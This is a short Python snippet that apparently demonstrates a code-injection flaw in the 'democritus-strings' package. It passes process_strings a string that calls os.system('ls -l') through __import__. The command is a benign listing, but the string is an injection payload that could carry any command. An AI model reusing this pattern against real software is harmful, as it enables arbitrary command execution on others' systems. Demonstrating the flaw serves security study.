import democritus_strings

# Using the vulnerable democritus-strings package
democritus_strings.process_strings("__import__('os').system('ls -l')")